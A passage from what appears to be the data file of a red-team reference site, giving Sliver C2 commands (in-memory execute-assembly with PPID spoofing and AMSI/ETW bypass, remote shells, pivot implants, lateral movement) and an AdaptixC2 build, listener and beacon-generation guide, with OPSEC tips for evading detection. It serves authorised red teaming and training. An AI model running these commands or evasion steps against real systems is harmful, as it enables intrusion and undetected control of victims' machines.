              { label: "PPID spoofing for fork-and-run tasks", cmd: "# -p sets the parent process to spoof so the sacrificial child looks legitimate\nexecute-assembly -p <parent-proc> -t <timeout> '<path>/Tool.exe' '<args>'\nexecute-assembly -P <ppid> -p <process> -t <timeout> '<path>/Tool.exe' '<args>'" }
            ]
          },
          {
            title: "Tool Execution (execute-assembly / execute)",
            type: "commands",
            commands: [
              { label: "Run a .NET assembly in memory (fork-and-run, PPID-spoofed)", cmd: "# spawns a sacrificial process, injects the tool, runs it, returns output, kills it\nexecute-assembly -p <parent-proc> -t <timeout> '<path>/Tool.exe' '<args>'" },
              { label: "Inline / self-inject (no new process) with AMSI + ETW bypass", cmd: "# -i in-process (self-inject) | -M AMSI bypass | -E ETW bypass | -t timeout\n# NOTE: -M/-E only apply with -i (current process); for a remote process use\n#       inject-amsi-bypass / inject-etw-bypass first.\nexecute-assembly -i -M -E -t <timeout> '<path>/Tool.exe' '<args>'" },
              { label: "Run OS commands / remote shells", cmd: "execute -o -t <timeout> <cmd> <args>            # -o capture output\nexecute -o -S -t <timeout> winrs -r:<host> <cmd> # -S save; remote WinRM shell" }
            ]
          },
          {
            title: "execute-assembly — key flags",
            type: "table",
            columns: ["Flag", "Meaning"],
            rows: [
              ["-p <proc>", "PPID-spoof / sacrificial parent process for fork-and-run (e.g. explorer.exe)"],
              ["-P <ppid>", "Numeric parent PID to spoof"],
              ["-i", "In-process / self-inject — run inside the implant's process, no new process (quieter, riskier)"],
              ["-M", "Apply the in-built AMSI bypass (only with -i / self-injection)"],
              ["-E", "Apply the in-built ETW bypass (only with -i / self-injection)"],
              ["-t <secs>", "Timeout for the task"],
              ["inline-execute-assembly", "Variant purpose-built for self-injection to avoid the fork-and-run technique"]
            ]
          },
          {
            title: "File Operations",
            type: "commands",
            commands: [
              { label: "Browse and read remote files / shares", cmd: "ls '\\\\<host>\\c$'\ncat '\\\\<host>\\<share>\\<file>'\ncd '<path>'" },
              { label: "Transfer files; make directories", cmd: "upload -t <timeout> '<local-path>' '<remote-path>'\ndownload '<remote-path>'\nmkdir '<path>'   |   rm '<path>'" }
            ]
          },
          {
            title: "Armory, Aliases & BOF Extensions",
            type: "commands",
            commands: [
              { label: "Install tools from the armory (they become native commands)", cmd: "armory                        # list available packages\narmory install <name>         # aliases (.NET, e.g. SharpUp) and extensions (BOF/COFF)\n# aliases run a .NET assembly like a native command; extensions load a BOF in-process" },
              { label: "Example enumeration / service BOFs (once installed)", cmd: "sa-sc-enum <host>                                   # enumerate services (BOF)\nsa-netshares -t <timeout> <host>                    # enumerate shares (BOF)\nsa-schtasksenum -t <timeout> <host>                 # enumerate scheduled tasks (BOF)\nremote-sc-stop / remote-sc-config / remote-sc-start # service control (BOF)\nscshell -t <timeout> <host> <service>               # SCShell fileless lateral movement" }
            ]
          },
          {
            title: "Pivoting (segmented networks)",
            type: "commands",
            commands: [
              { label: "Open a pivot listener on the foothold", cmd: "pivots tcp --lport <pivot-port>   # TCP pivot on the foothold\npivots                            # list active pivots\n# named-pipe pivots carry C2 over SMB and blend as normal Windows IPC" },
              { label: "Build an internal implant that connects to the pivot", cmd: "# internal hosts that can't egress beacon to the foothold's pivot, which relays to C2:\ngenerate --tcp-pivot <foothold-ip>:<pivot-port> -e -f shellcode -N <implant-name> -s <save-path>" }
            ]
          },
          {
            title: "Multiplayer & Operators",
            type: "commands",
            commands: [
              { label: "Enable multiplayer and add an operator", cmd: "[server] sliver > multiplayer                       # enable the multiplayer listener\n[server] sliver > new-operator --name <operator> --lhost <c2-host>\n# hand the generated .cfg to the operator; they connect with: sliver-client import <cfg>" }
            ]
          },
          {
            title: "OPSEC Notes",
            type: "notes",
            items: [
              "Beacon with a long sleep + jitter for stealth; switch to an interactive session only for short hands-on-keyboard bursts.",
              "Prefer inline execute-assembly (-i) with AMSI/ETW bypass (-M/-E) for the quietest execution, but remember a crash takes the implant — fork-and-run is the safer default.",
              "PPID-spoof to a legitimate parent (explorer.exe, taskhostw.exe) so fork-and-run children don't create suspicious process lineage.",
              "Run only one egress channel (the foothold) and pivot everything else internally over TCP/named-pipe to keep the network footprint small.",
              "Change default certificates, ports, URIs and pipe names — framework defaults are widely signatured; obfuscate implants (-e) so builds aren't hash-identical.",
              "Running offensive .NET in memory via execute-assembly avoids dropping tools to disk and most script-oriented logging (see the Windows Telemetry and Defense Evasion theory pages)."
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "Sliver — GitHub (BishopFox)", url: "https://github.com/BishopFox/sliver" },
              { label: "Sliver — official wiki / documentation", url: "https://sliver.sh/docs" },
              { label: "Theory — C2 Frameworks", url: "theory/2026-09-23-command-and-control.html" },
              { label: "Theory — Sliver C2 Architecture", url: "theory/2026-09-23-sliver-c2.html" },
              { label: "Theory — In-Memory Post-Exploitation Tradecraft", url: "theory/2026-09-23-in-memory-tradecraft.html" }
            ]
          }
        ]
      },
      {
        "id": "adaptix-c2",
        "name": "Adaptix C2",
        "url": "https://github.com/Adaptix-Framework/AdaptixC2",
        "description": "Open-source, extensible post-exploitation and C2 framework — a Go team server with a cross-platform Qt client.",
        "brief": "AdaptixC2 is an open-source command-and-control framework for authorised red teaming. The team server (adaptixserver) is written in Go; the GUI client (AdaptixClient) is C++/Qt6 and runs on Linux, Windows and macOS. Listeners and agents (\"beacons\") are plugins called extenders, loaded from a YAML profile. This guide builds both halves from source and runs them on a single host (client and server on the same box) — the normal production split is a hardened VPS for the team server with operators connecting remotely.\n\nThe defaults are lab defaults: the team server listens on 0.0.0.0:4321 with the password \"pass\". Change the password and bind locally before you expose anything.",
        "quickReference": [
          {
            "label": "Install build deps (Linux, as root)",
            "cmd": "sudo ./pre_install_linux_all.sh all"
          },
          {
            "label": "Build server + client",
            "cmd": "make server && make client   # artifacts in ./dist"
          },
          {
            "label": "Generate the TLS cert (inside dist/)",
            "cmd": "cd dist && bash ssl_gen.sh"
          },
          {
            "label": "Start the team server",
            "cmd": "./adaptixserver -profile profile.yaml"
          },
          {
            "label": "Start the GUI client",
            "cmd": "./AdaptixClient"
          }
        ],
        "sections": [
          {
            "title": "Architecture",
            "type": "table",
            "columns": [
              "Component",
              "What it is"
            ],
            "rows": [
              [
                "Team server (adaptixserver)",
                "Go process holding all engagement state. Serves operators over TLS on the team-server port, and agents through listeners."
              ],
              [
                "GUI client (AdaptixClient)",
                "C++/Qt6 client that connects to the team server. Multiple operators can connect at once and share visibility."
              ],
              [
                "Profile (profile.yaml)",
                "The team server's config: bind interface, port, endpoint, operator auth, TLS cert/key, and which extenders to load."
              ],
              [
                "Extender",
                "Listeners and agents ship as plugins: Beacon listeners (HTTP/S, SMB, TCP, DNS/DoH), the Beacon agent, and the Gopher TCP/mTLS listener + agent."
              ],
              [
                "Listener",
                "Defines how agents reach the team server. Created and configured from the client once connected."
              ],
              [
                "Agent / beacon",
                "The payload on the target. Checks in on a sleep/jitter interval and is tasked from the operator console."
              ]
            ]
          },
          {
            "title": "Architecture at a glance",
            "type": "figure",
            "caption": "Operators run the Qt client and connect to the team server over TLS (default :4321/endpoint). The team server loads listeners from its profile; agents call back to a listener — often through a disposable redirector — and can link to peer agents over SMB or TCP for internal pivoting.",
            "svg": "<svg viewBox='0 0 900 360' xmlns='http://www.w3.org/2000/svg' role='img' aria-label='AdaptixC2 architecture diagram: operators connect to the team server over TLS; agents call back through a redirector to listeners on the team server; agents link to peer agents over SMB or TCP.'><defs><marker id='axar' viewBox='0 0 10 10' refX='9' refY='5' markerWidth='7' markerHeight='7' orient='auto-start-reverse'><path d='M0 0 L10 5 L0 10 z' fill='var(--accent)'/></marker><style>.b{fill:var(--surface);stroke:var(--border);stroke-width:1.5}.t{fill:var(--text);font-family:inherit;font-size:14px;font-weight:600}.s{fill:var(--muted);font-family:inherit;font-size:11.5px}.lab{fill:var(--muted);font-family:inherit;font-size:11px}.ln{stroke:var(--accent);stroke-width:2;fill:none;marker-end:url(#axar)}.peer{stroke:var(--muted);stroke-width:1.5;stroke-dasharray:5 4;fill:none;marker-end:url(#axar)}</style></defs><rect class='b' x='14' y='140' width='150' height='80' rx='10'/><text class='t' x='89' y='172' text-anchor='middle'>Operators</text><text class='s' x='89' y='192' text-anchor='middle'>AdaptixClient</text><text class='s' x='89' y='207' text-anchor='middle'>(multiplayer)</text><rect class='b' x='238' y='104' width='200' height='152' rx='10'/><text class='t' x='338' y='134' text-anchor='middle'>Team Server</text><text class='s' x='338' y='156' text-anchor='middle'>adaptixserver</text><text class='s' x='338' y='174' text-anchor='middle'>profile.yaml</text><text class='s' x='338' y='192' text-anchor='middle'>extenders /</text><text class='s' x='338' y='207' text-anchor='middle'>listeners</text><text class='s' x='338' y='229' text-anchor='middle'>TLS cert + key</text><rect class='b' x='512' y='140' width='140' height='80' rx='10'/><text class='t' x='582' y='174' text-anchor='middle'>Redirector</text><text class='s' x='582' y='194' text-anchor='middle'>(reverse proxy)</text><rect class='b' x='724' y='66' width='162' height='74' rx='10'/><text class='t' x='805' y='96' text-anchor='middle'>Beacon agent</text><text class='s' x='805' y='116' text-anchor='middle'>Windows</text><rect class='b' x='724' y='220' width='162' height='74' rx='10'/><text class='t' x='805' y='250' text-anchor='middle'>Gopher agent</text><text class='s' x='805' y='270' text-anchor='middle'>Linux / macOS</text><line class='ln' x1='164' y1='180' x2='236' y2='180'/><text class='lab' x='200' y='170' text-anchor='middle'>TLS :4321</text><text class='lab' x='200' y='196' text-anchor='middle'>/endpoint</text><line class='ln' x1='438' y1='180' x2='510' y2='180'/><text class='lab' x='474' y='172' text-anchor='middle'>listeners</text><line class='ln' x1='652' y1='168' x2='722' y2='110'/><text class='lab' x='690' y='128' text-anchor='middle'>C2</text><line class='ln' x1='652' y1='192' x2='722' y2='252'/><text class='lab' x='690' y='238' text-anchor='middle'>C2</text><line class='peer' x1='805' y1='140' x2='805' y2='220'/><text class='lab' x='812' y='184' text-anchor='start'>SMB / TCP</text><text class='lab' x='812' y='198' text-anchor='start'>peer (link)</text></svg>"
          },
          {
            "title": "Install & build (Linux)",
            "type": "commands",
            "commands": [
              {
                "label": "1. Clone and install dependencies",
                "cmd": "git clone https://github.com/Adaptix-Framework/AdaptixC2\ncd AdaptixC2\n# installs Go 1.25+, mingw-w64, Qt6, cmake, etc. (server | client | all)\nsudo ./pre_install_linux_all.sh all"
              },
              {
                "label": "2. Build — everything lands in ./dist",
                "cmd": "make server      # -> dist/adaptixserver  (+ ssl_gen.sh, profile.yaml, 404page.html)\nmake client      # -> dist/AdaptixClient   (use 'make client-fast' for a parallel build)\nmake extenders   # -> dist/extenders/*      (the listeners + agents)\n# or build all three at once:\nmake all"
              },
              {
                "label": "Note on the Go fork",
                "cmd": "# the pre-install script also fetches Adaptix's go-win7 fork, used to compile\n# the Gopher agent with Windows 7 support. A Docker build (make docker-build-all)\n# is available if you don't want to install the toolchains on the host."
              }
            ]
          },
          {
            "title": "Alternative — build/run with Docker",
            "type": "commands",
            "commands": [
              {
                "label": "Build server + extenders without installing toolchains",
                "cmd": "# the repo ships a Dockerfile + docker-compose.yml with build profiles\nmake docker-build-server-ext      # builds adaptixserver + extenders in a container\nmake docker-build-client          # builds the client as an AppImage\nmake docker-build-all             # server + extenders"
              },
              {
                "label": "Run the server as a container",
                "cmd": "make docker-up        # start the runtime container (detached)\nmake docker-logs      # follow logs\nmake docker-down      # stop it\n# handy on a VPS where you don't want Go/Qt/mingw on the host."
              }
            ]
          },
          {
            "title": "Keeping it current",
            "type": "commands",
            "commands": [
              {
                "label": "Update and rebuild",
                "cmd": "cd AdaptixC2\ngit pull\nmake all          # rebuild server, client and extenders\n# AdaptixC2 moves fast; new agent/listener features ship as extenders, so\n# rebuild the extenders after pulling. Contributions target the 'dev' branch."
              }
            ]
          },
          {
            "title": "Create the team-server TLS certificate",
            "type": "commands",
            "commands": [
              {
                "label": "Use the shipped helper (inside dist/)",
                "cmd": "cd dist\nbash ssl_gen.sh\n#   -> server.rsa.key  server.rsa.crt    (self-signed RSA-2048, valid 10 years)"
              },
              {
                "label": "…or generate it manually (equivalent)",
                "cmd": "openssl req -x509 -nodes -newkey rsa:2048 \\\n  -keyout server.rsa.key -out server.rsa.crt -days 3650 -subj \"/CN=localhost\""
              },
              {
                "label": "Key point",
                "cmd": "# the file names here must match the cert:/key: fields in profile.yaml.\n# ssl_gen.sh also documents an ECDSA option (secp384r1) if you prefer EC keys."
              }
            ]
          },
          {
            "title": "The server profile (profile.yaml)",
            "type": "commands",
            "commands": [
              {
                "label": "The Teamserver block is what you edit to start",
                "cmd": "Teamserver:\n  interface: \"0.0.0.0\"     # use 127.0.0.1 to bind local-only (client+server same host)\n  port: 4321               # team-server / operator port\n  endpoint: \"/endpoint\"    # client connects to https://<host>:4321/endpoint\n  password: \"pass\"         # CHANGE THIS — the shared team password\n  only_password: true      # true = password only;  false = use the operators map below\n  operators:\n    operator1: \"pass1\"     # per-operator creds (when only_password: false)\n  cert: \"server.rsa.crt\"   # must match the files generated above\n  key:  \"server.rsa.key\"\n  extenders:               # listeners + agents to load — keep the defaults\n    - \"extenders/beacon_listener_http/config.yaml\"\n    - \"extenders/beacon_agent/config.yaml\""
              },
              {
                "label": "Before first run",
                "cmd": "# change password from the default, and set interface to 127.0.0.1 for a\n# single-host lab. Port 4321 is the well-known default and is widely scanned."
              }
            ]
          },
          {
            "title": "Start the team server",
            "type": "commands",
            "commands": [
              {
                "label": "Run it from dist/ (cert, profile and extenders are relative paths)",
                "cmd": "cd dist\n./adaptixserver -profile profile.yaml       # add -debug for verbose logging\n# it binds the interface:port from the profile (default 0.0.0.0:4321) over TLS\n# and loads each extender listed in the profile."
              }
            ]
          },
          {
            "title": "Connect the client — same host",
            "type": "commands",
            "commands": [
              {
                "label": "Launch the GUI and fill in the connection dialog",
                "cmd": "cd dist\n./AdaptixClient        # opens the Qt GUI; add a New Profile in the connect dialog:\n#   Project   any local name for this saved connection\n#   Host      127.0.0.1        (client and server on the same box)\n#   Port      4321             (the Teamserver port from the profile)\n#   Endpoint  /endpoint        (must match the profile)\n#   Username  any operator name (e.g. op1)\n#   Password  the Teamserver password (or an operator password)\n# Click Connect — the client talks to https://127.0.0.1:4321/endpoint."
              },
              {
                "label": "Self-signed cert",
                "cmd": "# the client accepts the self-signed cert for a local/lab setup; for real ops\n# use a proper domain + trusted cert and front the listener with a redirector."
              }
            ]
          },
          {
            "title": "The Connect dialog",
            "type": "figure",
            "caption": "The AdaptixClient Connect dialog. Server Details takes the full team-server URL (https://host:4321/endpoint); User Info takes an operator name and password; Project names a local workspace, whose directory is created automatically if left blank. These map directly onto the team-server profile.",
            "svg": "<svg id='axcon' viewBox='0 0 470 390' xmlns='http://www.w3.org/2000/svg' role='img' aria-label='AdaptixClient Connect dialog mockup: a User Info group (User, Password), a Server Details group (URL), and a Project group (Name, Directory), with Connect and Cancel buttons.'><defs><clipPath id='axconclip'><rect x='8' y='8' width='454' height='374' rx='8'/></clipPath><style>#axcon .lab{fill:#9a9cb0;font-family:Inter,Segoe UI,sans-serif;font-size:12px}#axcon .gl{fill:#c4c6d4;font-family:Inter,Segoe UI,sans-serif;font-size:11.5px;font-weight:600}#axcon .val{fill:#d6d7e0;font-family:'JetBrains Mono',monospace;font-size:11px}#axcon .in{fill:#23242f;stroke:#3b3d4e;stroke-width:1}#axcon .gb{fill:none;stroke:#3b3d4e;stroke-width:1}#axcon .bt{font-family:Inter,Segoe UI,sans-serif;font-size:12.5px;font-weight:600}</style></defs><g clip-path='url(#axconclip)'><rect x='8' y='8' width='454' height='374' fill='#1e1f29'/><rect x='8' y='8' width='454' height='32' fill='#2a2b38'/><text x='24' y='29' fill='#d6d7e0' font-family='Inter,Segoe UI,sans-serif' font-size='13' font-weight='600'>Connect</text><circle cx='446' cy='24' r='5' fill='#d9933f'/><rect class='gb' x='24' y='58' width='422' height='84' rx='6'/><rect x='38' y='50' width='64' height='16' fill='#1e1f29'/><text x='44' y='62' class='gl'>User Info</text><text x='44' y='96' class='lab'>User:</text><rect class='in' x='150' y='80' width='280' height='26' rx='4'/><text x='160' y='97' class='val'>op1</text><text x='44' y='128' class='lab'>Password:</text><rect class='in' x='150' y='112' width='280' height='26' rx='4'/><text x='160' y='129' class='val'>&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;</text><rect class='gb' x='24' y='158' width='422' height='56' rx='6'/><rect x='38' y='150' width='90' height='16' fill='#1e1f29'/><text x='44' y='162' class='gl'>Server Details</text><text x='44' y='196' class='lab'>URL:</text><rect class='in' x='150' y='180' width='280' height='26' rx='4'/><text x='160' y='197' class='val'>https://127.0.0.1:4321/endpoint</text><rect class='gb' x='24' y='230' width='422' height='84' rx='6'/><rect x='38' y='222' width='54' height='16' fill='#1e1f29'/><text x='44' y='234' class='gl'>Project</text><text x='44' y='268' class='lab'>Name:</text><rect class='in' x='150' y='252' width='280' height='26' rx='4'/><text x='160' y='269' class='val'>MyLab</text><text x='44' y='300' class='lab'>Directory:</text><rect class='in' x='150' y='284' width='250' height='26' rx='4'/><text x='160' y='301' class='val'>~/AdaptixProjects/MyLab</text><rect x='404' y='284' width='26' height='26' rx='4' fill='#2a2b38' stroke='#3b3d4e'/><path d='M409 303 v-9 h5 l2 2 h7 v7 z' fill='none' stroke='#9a9cb0' stroke-width='1.1'/><rect x='216' y='336' width='106' height='32' rx='5' fill='#2a2b38' stroke='#3b3d4e'/><text x='269' y='357' text-anchor='middle' class='bt' fill='#d6d7e0'>Cancel</text><rect x='330' y='336' width='106' height='32' rx='5' fill='#3d7dfd'/><text x='383' y='357' text-anchor='middle' class='bt' fill='#ffffff'>Connect</text></g><rect x='8' y='8' width='454' height='374' rx='8' fill='none' stroke='#3b3d4e' stroke-width='1.5'/></svg>"
          },
          {
            "title": "Operator usage — listener, agent, interact",
            "type": "commands",
            "commands": [
              {
                "label": "1. Create a listener",
                "cmd": "# In the client:  Listeners  ->  Create  ->  BeaconHTTP\n#   BindHost 0.0.0.0, BindPort 443 (or 80), and the Callback host/port the\n#   agent will reach. Other types: BeaconSMB, BeaconTCP, BeaconDNS, Gopher."
              },
              {
                "label": "2. Generate an agent for that listener",
                "cmd": "# Agents -> Generate :  pick the listener, agent = beacon, and an output format\n#   (exe / dll / service exe / raw shellcode). The agent is bound to that listener."
              },
              {
                "label": "3. Run it on the target, then interact",
                "cmd": "# execute the agent on the target host -> it checks in and appears in the Agents\n# table. Right-click the agent -> Console (Interact) to open its task console."
              }
            ]
          },
          {
            "title": "New listener — BeaconHTTP (Main settings)",
            "type": "figure",
            "caption": "The BeaconHTTP listener editor, Main-settings tab, with the shipped defaults: bind port 443, method POST, the three default URIs, the Firefox/20 User-Agent, the X-Beacon-Id heartbeat header and a random 32-hex encryption key. The HTTP Headers, Page Error and Page Payload tabs shape the rest of the response. Change every default before you expose a listener — each is a published IOC.",
            "svg": "<svg id='axlis' viewBox='0 0 644 578' xmlns='http://www.w3.org/2000/svg' role='img' aria-label='AdaptixClient Create Listener dialog mockup for BeaconHTTP, showing the Main settings tab: Host and port bind, Callback addresses, Method, URIs, User-Agents, Heartbeat Header, Encryption key and a Use SSL option.'><defs><clipPath id='axlisclip'><rect x='8' y='8' width='628' height='562' rx='8'/></clipPath><style>#axlis .lab{fill:#9a9cb0;font-family:Inter,Segoe UI,sans-serif;font-size:12px}#axlis .val{fill:#d6d7e0;font-family:'JetBrains Mono',monospace;font-size:11.5px}#axlis .mut{fill:#8b8da0;font-family:'JetBrains Mono',monospace;font-size:11.5px}#axlis .in{fill:#23242f;stroke:#3b3d4e;stroke-width:1}#axlis .cap{fill:#9a9cb0;font-family:Inter,Segoe UI,sans-serif;font-size:11px}</style></defs><g clip-path='url(#axlisclip)'><rect x='8' y='8' width='628' height='562' fill='#1e1f29'/><rect x='8' y='8' width='628' height='32' fill='#2a2b38'/><text x='24' y='29' fill='#d6d7e0' font-family='Inter,Segoe UI,sans-serif' font-size='13' font-weight='600'>Create listener</text><circle cx='620' cy='24' r='5' fill='#d9933f'/><text x='24' y='62' class='lab'>Type</text><rect class='in' x='110' y='48' width='220' height='25' rx='4'/><text x='120' y='65' class='val'>BeaconHTTP</text><text x='318' y='65' class='mut'>&#9662;</text><rect x='16' y='86' width='140' height='28' rx='4' fill='#1e1f29' stroke='#3d7dfd' stroke-width='1.5'/><text x='86' y='104' text-anchor='middle' fill='#d6d7e0' font-family='Inter,Segoe UI,sans-serif' font-size='11.5'>Main settings</text><text x='182' y='104' class='cap'>HTTP Headers</text><text x='292' y='104' class='cap'>Page Error</text><text x='392' y='104' class='cap'>Page Payload</text><line x1='16' y1='114' x2='628' y2='114' stroke='#3b3d4e'/><text x='24' y='146' class='lab'>Host &amp; port (Bind)</text><rect class='in' x='180' y='131' width='210' height='25' rx='4'/><text x='190' y='148' class='val'>0.0.0.0</text><text x='378' y='148' class='mut'>&#9662;</text><rect class='in' x='400' y='131' width='74' height='25' rx='4'/><text x='410' y='148' class='val'>443</text><text x='24' y='184' class='lab'>Callback addresses</text><rect class='in' x='180' y='169' width='294' height='38' rx='4'/><text x='190' y='192' class='val'>https://cdn.example.com:443</text><rect x='480' y='169' width='24' height='18' rx='3' fill='#2a2b38' stroke='#3b3d4e'/><text x='492' y='182' text-anchor='middle' class='mut'>+</text><rect x='480' y='189' width='24' height='18' rx='3' fill='#2a2b38' stroke='#3b3d4e'/><text x='492' y='202' text-anchor='middle' class='mut'>&#8722;</text><text x='24' y='230' class='lab'>Method</text><rect class='in' x='180' y='215' width='140' height='25' rx='4'/><text x='190' y='232' class='val'>POST</text><text x='308' y='232' class='mut'>&#9662;</text><text x='24' y='268' class='lab'>URIs</text><rect class='in' x='180' y='253' width='294' height='54' rx='4'/><text x='190' y='272' class='val'>/api/v1/status</text><text x='190' y='289' class='val'>/updates/check.php</text><text x='190' y='306' class='val'>/content.html</text><text x='24' y='336' class='lab'>User-Agents</text><rect class='in' x='180' y='321' width='438' height='25' rx='4'/><text x='190' y='338' class='val'>Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0</text><text x='24' y='374' class='lab'>Heartbeat Header</text><rect class='in' x='180' y='359' width='220' height='25' rx='4'/><text x='190' y='376' class='val'>X-Beacon-Id</text><text x='24' y='412' class='lab'>Encryption key</text><rect class='in' x='180' y='397' width='330' height='25' rx='4'/><text x='190' y='414' class='val'>9f3a7c1e5b8d2046a1c9ef7308b5d2a6</text><rect x='520' y='397' width='98' height='25' rx='4' fill='#2a2b38' stroke='#3b3d4e'/><text x='569' y='414' text-anchor='middle' fill='#d6d7e0' font-family='Inter,Segoe UI,sans-serif' font-size='11.5'>Generate</text><rect x='180' y='438' width='16' height='16' rx='3' fill='#23242f' stroke='#3b3d4e'/><text x='206' y='451' class='lab'>Use SSL (HTTPS) &#8212; auto-generate cert/key if empty</text><line x1='16' y1='486' x2='628' y2='486' stroke='#3b3d4e'/><rect x='408' y='506' width='100' height='32' rx='5' fill='#2a2b38' stroke='#3b3d4e'/><text x='458' y='527' text-anchor='middle' fill='#d6d7e0' font-family='Inter,Segoe UI,sans-serif' font-size='12.5' font-weight='600'>Cancel</text><rect x='518' y='506' width='100' height='32' rx='5' fill='#3d7dfd'/><text x='568' y='527' text-anchor='middle' fill='#ffffff' font-family='Inter,Segoe UI,sans-serif' font-size='12.5' font-weight='600'>Create</text></g><rect x='8' y='8' width='628' height='562' rx='8' fill='none' stroke='#3b3d4e' stroke-width='1.5'/></svg>"
          },
          {
            "title": "Generate agent — beacon",
            "type": "figure",
            "caption": "The beacon build dialog. Choose the listener to bind to, architecture (x64/x86) and output format (Exe, Service Exe, DLL or raw Shellcode); set the initial Sleep and Jitter (defaults 4s / 0%). 'Set killdate' and 'Set workingtime' bake in time limits, 'IAT Hiding' empties the import table, and the DNS-settings box appears for BeaconDNS listeners.",
            "svg": "<svg id='axgen' viewBox='0 0 600 486' xmlns='http://www.w3.org/2000/svg' role='img' aria-label='AdaptixClient Generate Agent dialog mockup for the beacon agent: Listener, Arch, Format, Sleep and Jitter, killdate and workingtime options, IAT Hiding, and Generate and Cancel buttons.'><defs><clipPath id='axgenclip'><rect x='8' y='8' width='584' height='470' rx='8'/></clipPath><style>#axgen .lab{fill:#9a9cb0;font-family:Inter,Segoe UI,sans-serif;font-size:12px}#axgen .val{fill:#d6d7e0;font-family:'JetBrains Mono',monospace;font-size:11.5px}#axgen .mut{fill:#8b8da0;font-family:'JetBrains Mono',monospace;font-size:11.5px}#axgen .in{fill:#23242f;stroke:#3b3d4e;stroke-width:1}</style></defs><g clip-path='url(#axgenclip)'><rect x='8' y='8' width='584' height='470' fill='#1e1f29'/><rect x='8' y='8' width='584' height='32' fill='#2a2b38'/><text x='24' y='29' fill='#d6d7e0' font-family='Inter,Segoe UI,sans-serif' font-size='13' font-weight='600'>Generate agent &#8212; beacon</text><circle cx='576' cy='24' r='5' fill='#d9933f'/><text x='24' y='70' class='lab'>Listener</text><rect class='in' x='150' y='55' width='420' height='26' rx='4'/><text x='160' y='73' class='val'>http-443   (BeaconHTTP)</text><text x='558' y='73' class='mut'>&#9662;</text><text x='24' y='108' class='lab'>Arch</text><rect class='in' x='150' y='93' width='150' height='26' rx='4'/><text x='160' y='111' class='val'>x64</text><text x='288' y='111' class='mut'>&#9662;</text><text x='24' y='146' class='lab'>Format</text><rect class='in' x='150' y='131' width='150' height='26' rx='4'/><text x='160' y='149' class='val'>Exe</text><text x='288' y='149' class='mut'>&#9662;</text><text x='318' y='149' class='mut'>Service Exe &#183; DLL &#183; Shellcode</text><text x='24' y='184' class='lab'>Sleep (Jitter %)</text><rect class='in' x='150' y='169' width='150' height='26' rx='4'/><text x='160' y='187' class='val'>4s</text><rect class='in' x='310' y='169' width='80' height='26' rx='4'/><text x='320' y='187' class='val'>0</text><text x='400' y='187' class='mut'>%</text><rect x='150' y='214' width='16' height='16' rx='3' fill='#23242f' stroke='#3b3d4e'/><text x='176' y='227' class='lab'>Set 'killdate'</text><rect x='320' y='214' width='16' height='16' rx='3' fill='#23242f' stroke='#3b3d4e'/><text x='346' y='227' class='lab'>Set 'workingtime'</text><rect x='150' y='246' width='16' height='16' rx='3' fill='#3d7dfd'/><path d='M153 254 l3 3 l6 -7' fill='none' stroke='#fff' stroke-width='1.6'/><text x='176' y='259' class='lab'>IAT Hiding (empty import table)</text><rect x='24' y='286' width='552' height='96' rx='6' fill='#191a22' stroke='#3b3d4e'/><rect x='40' y='278' width='96' height='16' fill='#1e1f29'/><text x='44' y='291' class='lab'>DNS settings</text><text x='40' y='320' class='mut'>DNS Mode     DNS (Direct UDP) &#9662;</text><text x='40' y='344' class='mut'>Resolvers    8.8.8.8, 1.1.1.1, 9.9.9.9</text><text x='40' y='368' class='mut'>(shown for BeaconDNS listeners; HTTP uses the proxy/UA tab)</text><rect x='366' y='404' width='100' height='32' rx='5' fill='#2a2b38' stroke='#3b3d4e'/><text x='416' y='425' text-anchor='middle' fill='#d6d7e0' font-family='Inter,Segoe UI,sans-serif' font-size='12.5' font-weight='600'>Cancel</text><rect x='476' y='404' width='100' height='32' rx='5' fill='#3d7dfd'/><text x='526' y='425' text-anchor='middle' fill='#ffffff' font-family='Inter,Segoe UI,sans-serif' font-size='12.5' font-weight='600'>Generate</text></g><rect x='8' y='8' width='584' height='470' rx='8' fill='none' stroke='#3b3d4e' stroke-width='1.5'/></svg>"
          },
          {
            "title": "Listener types & configuration",
            "type": "table",
            "columns": [
              "Listener",
              "Transport & what you configure"
            ],
            "rows": [
              [
                "BeaconHTTP / HTTPS",
                "The workhorse. Bind host/port + callback addresses, method POST or GET (default POST), the URI list, User-Agent list, the heartbeat header (default X-Beacon-Id), a hex encryption key, optional SSL (cert/key auto-generated if blank), Host/Request/Server headers, Trust X-Forwarded-For, and custom Page Error (404) and Page Payload responses for traffic shaping."
              ],
              [
                "BeaconSMB",
                "Peer-to-peer over a named pipe — no direct egress. The agent is reached from another agent by pipe name (link smb). Ideal for internal hosts with no outbound route."
              ],
              [
                "BeaconTCP",
                "Peer-to-peer over a raw TCP port, reached with link tcp. The other internal pivoting option."
              ],
              [
                "BeaconDNS / DoH",
                "C2 over DNS (direct UDP), DNS-over-HTTPS, or either with fallback — slow but often permitted outbound. DNS burst mode tunes throughput."
              ],
              [
                "Gopher (TCP / mTLS)",
                "The listener for the Gopher agent (Linux/macOS), plain TCP or mutually-authenticated TLS."
              ]
            ]
          },
          {
            "title": "Payload / agent generation",
            "type": "table",
            "columns": [
              "Build option",
              "Choices"
            ],
            "rows": [
              [
                "Agent",
                "Beacon (Windows) or Gopher (Linux/macOS). Third-party agents (e.g. Kharon) register the same way."
              ],
              [
                "Listener",
                "Which listener this agent calls back to — bound at build time."
              ],
              [
                "Architecture",
                "x64 or x86."
              ],
              [
                "Format",
                "Exe, Service Exe (with a service name), DLL, or raw Shellcode."
              ],
              [
                "Sleep (jitter %)",
                "Initial check-in interval and jitter (default 4s, 0% — set e.g. 1h 2m 5s), adjustable later with sleep."
              ],
              [
                "Transport extras",
                "Per-listener: DNS mode (Direct/DoH/fallback) and resolvers, an outbound HTTP/HTTPS proxy (server + creds), and callback rotation (sequential / random)."
              ]
            ]
          },
          {
            "title": "Redirector & traffic shaping",
            "type": "commands",
            "commands": [
              {
                "label": "Why",
                "cmd": "# never expose the team server directly. A redirector is a cheap, disposable\n# host that forwards only valid beacon traffic (matching your HTTP profile) to\n# the team server and shows a decoy to everything else — rotate it when burned."
              },
              {
                "label": "Apache mod_rewrite redirector (match your listener's URIs)",
